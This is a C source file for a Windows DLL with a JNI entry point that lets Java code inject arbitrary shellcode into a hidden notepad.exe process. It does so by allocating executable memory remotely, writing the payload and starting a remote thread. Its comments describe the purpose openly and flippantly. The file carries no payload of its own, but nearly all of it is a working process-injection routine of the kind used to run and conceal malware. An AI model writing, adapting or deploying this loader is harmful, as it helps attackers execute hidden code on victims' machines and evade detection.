
#include <windows.h>
#include <stdio.h>

#include <jni.h>
#include <Demo.h>

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void inject(LPCVOID buffer, int length) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hProcess = NULL;
	SIZE_T wrote;
	LPVOID ptr;
	char lbuffer[1024];
	char cmdbuff[1024];
	/* reset some stuff */
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );
	/* start a process */
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = NULL;
	si.hStdError = NULL;
	si.hStdInput = NULL;
	/* resolve windir? */
	GetEnvironmentVariableA("windir", lbuffer, 1024);
	/* setup our path... choose wisely for 32bit and 64bit platforms */
#ifdef _IS64_
	snprintf(cmdbuff, 1024, "%s\\SysWOW64\\notepad.exe", lbuffer);
#else
	snprintf(cmdbuff, 1024, "%s\\System32\\notepad.exe", lbuffer);
#endif
	/* spawn the process, baby! */
	if (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
	    printf("CreateProcessA('%s') failed\n", cmdbuff);
		return;
	}
	hProcess = pi.hProcess;
	if( !hProcess ) {
	    printf("process is missing\n");
		return;
	}
	/* allocate memory in our process */
	ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	/* write our shellcode to the process */
    printf("writing to memory\n");
	WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&wrote);
	if (wrote != length) {
	    printf("failed to write\n");
		return;
	}
	/* create a thread in the process */
    printf("creating thread\n");
	CreateRemoteThread(hProcess, NULL, 0, ptr, NULL, 0, NULL);
}


JNIEXPORT void JNICALL Java_Demo_inject(JNIEnv * env, jobject object, jbyteArray jdata) {
	jbyte * data = (*env)->GetByteArrayElements(env, jdata, 0);
	jsize length = (*env)->GetArrayLength(env, jdata);
    printf("Java_Demo_inject(...) called\n");
	inject((LPCVOID)data, (SIZE_T)length);
	(*env)->ReleaseByteArrayElements(env, jdata, data, 0);
}



BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {

    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
	        printf("Load working...\n");
            break;

        case DLL_PROCESS_DETACH:
	        printf("Unload working...\n");
            break;

        case DLL_THREAD_ATTACH:
	        printf("ThreadLoad working...\n");
            break;

        case DLL_THREAD_DETACH:
	        printf("ThreadUnload working...\n");
            break;
    }

    return TRUE;
} 

